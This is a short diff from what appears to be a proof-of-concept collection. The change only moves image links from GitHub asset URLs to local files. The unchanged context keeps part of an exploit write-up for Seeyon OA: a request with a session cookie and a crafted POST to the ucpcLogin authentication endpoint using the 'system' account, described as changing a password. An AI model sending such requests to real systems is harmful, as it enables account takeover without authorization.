@@ -24,13 +24,13 @@ Connection: close
 Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
 ```
 
-![image](https://github.com/wy876/POC/assets/139549762/c5cf82fe-e0ac-413c-9dc7-b2a0f9e15e9c)
+![image](../../images/c5cf82fe-e0ac-413c-9dc7-b2a0f9e15e9c.png)
 
 ## 构造数据包更改密码
 
 ```
 POST /seeyon/rest/authentication/ucpcLogin?login_username=system&login_password=share.do&ticket= 
 ```
-![image](https://github.com/wy876/POC/assets/139549762/6b5f019d-6a30-42d7-9f8b-787a072b5848)
+![image](../../images/6b5f019d-6a30-42d7-9f8b-787a072b5848.png)
 
-![image](https://github.com/wy876/POC/assets/139549762/05232b2a-c6a5-41ef-b695-0714a28f567e)
+![image](../../images/05232b2a-c6a5-41ef-b695-0714a28f567e.png)
